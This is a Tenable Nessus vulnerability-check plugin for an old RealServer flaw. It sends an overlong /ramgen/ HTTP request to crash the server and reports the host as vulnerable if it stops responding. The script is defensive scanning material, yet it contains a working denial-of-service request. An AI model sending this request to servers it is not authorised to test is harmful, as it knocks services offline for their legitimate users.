#
# (C) Tenable Network Security, Inc.
#

# Original exploit code : see http://www.beavuh.org
#

include("compat.inc");

if (description)
{
 script_id(10199);
 script_version("$Revision: 1.28 $");
 script_cvs_date("$Date: 2014/05/26 15:47:04 $");

 script_cve_id("CVE-2000-0001");
 script_bugtraq_id(888);
 script_osvdb_id(1171);

 script_name(english:"RealServer Long ramgen Request Remote DoS");
 script_summary(english:"Overflows a buffer in RealServer");

 script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote Real Server by sending the request :

 GET /ramgen/AAAAA[...]AAA HTTP/1.1

An attacker may use this flaw to prevent this system from serving Real
Audio or Video content to legitimate clients.");
 script_set_attribute(attribute:"solution", value:"Upgrade to a fixed version of RealServer.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/12/22");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/01/09");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2014 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_require_ports(7070, "Services/realserver");

 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/realserver");
if(!port)port = 7070;
if (! get_port_state(port)) exit(0);

if (http_is_dead(port:port))exit(0);

r = http_send_recv3(method: "GET", item: strcat("/ramgen/", crap(4096)), port:port);

if (http_is_dead(port:port, retry: 3)) security_warning(port);

